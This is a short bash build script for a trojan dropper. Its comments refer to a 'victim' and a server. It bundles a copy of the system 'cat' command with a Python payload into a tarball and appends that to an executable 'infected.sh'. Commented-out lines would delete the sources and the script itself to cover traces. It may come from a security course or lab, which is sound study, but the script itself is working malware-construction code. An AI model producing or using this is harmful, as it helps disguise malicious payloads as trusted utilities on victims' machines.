#!/bin/bash
# assume test.py has been send from server to victim
# this example use temp_cat as original cat
tar -cvzf temp_cat.tar.gz temp_cat test.py

# uncomment to remove temp_cat and test.py
#rm temp_cat test.py

# assume infected.sh also got from server
cat temp_cat.tar.gz >> infected.sh
chmod +x infected.sh

# uncomment to remove this shell after execute
#rm build.sh
